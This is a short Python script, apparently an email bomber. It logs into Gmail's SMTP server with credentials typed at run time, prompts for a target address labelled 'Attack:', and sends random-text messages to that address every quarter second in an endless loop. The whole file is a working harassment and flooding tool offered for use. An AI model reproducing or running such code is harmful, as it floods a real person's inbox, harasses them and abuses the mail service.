import smtplib
import random
import os
import time

SUBJECT = str(random.randint(1,1000))

TEXT = str(random.randint(1,1000))
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(input("Email:"),input("Password:"))
os.system("clear")
TO = input("Attack:")
while True:

    time.sleep(0.25)
    server.sendmail("shrekt",TO,TEXT,SUBJECT)
server.quit()
